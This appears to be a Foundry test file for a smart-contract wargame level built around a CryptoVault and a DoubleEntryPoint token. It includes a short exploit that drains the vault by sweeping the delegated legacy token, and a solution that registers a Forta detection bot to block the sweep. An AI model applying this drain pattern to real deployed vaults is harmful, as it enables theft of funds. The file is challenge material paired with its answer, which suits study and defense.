// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {CryptoVault, LegacyToken, DoubleEntryPoint, Forta, DelegateERC20} from "../src/Level26.sol";
import {Solution} from "../src/Level26Solution.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract Level26Test is Test {
    CryptoVault public target;
    address public token1;
    address public token2;

    VmSafe.Wallet attacker;
    VmSafe.Wallet player;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        player = vm.createWallet("player");
        VmSafe.Wallet memory deployer = vm.createWallet("deployer");

        target = new CryptoVault(deployer.addr);

        LegacyToken legacyToken = new LegacyToken();
        legacyToken.mint(address(target), 100 ether);

        Forta forta = new Forta();

        DoubleEntryPoint dep = new DoubleEntryPoint(
            address(legacyToken),
            address(target),
            address(forta),
            player.addr
        );
        legacyToken.delegateToNewContract(DelegateERC20(address(dep)));

        target.setUnderlying(address(dep));
    }

    function test_exploit() public {
        vm.startPrank(attacker.addr, attacker.addr);
        exploit(address(target));
        vm.stopPrank();

        assertEq(target.underlying().balanceOf(address(target)), 0);
    }

    function test_solution() public {
        vm.startPrank(player.addr, player.addr);
        solution(address(target));
        vm.stopPrank();

        vm.startPrank(attacker.addr, attacker.addr);
        IERC20 underlying = CryptoVault(target).underlying();
        address legacy = DoubleEntryPoint(address(underlying)).delegatedFrom();

        vm.expectRevert();
        CryptoVault(target).sweepToken(IERC20(legacy));
        vm.stopPrank();
    }

    function exploit(address _target) private {
        IERC20 underlying = CryptoVault(_target).underlying();
        address legacy = DoubleEntryPoint(address(underlying)).delegatedFrom();
        CryptoVault(_target).sweepToken(IERC20(legacy));
    }

    function solution(address _target) private {
        Forta forta = DoubleEntryPoint(address(CryptoVault(_target).underlying())).forta();
        Solution bot = new Solution(address(forta), _target);
        forta.setDetectionBot(address(bot));
    }
}
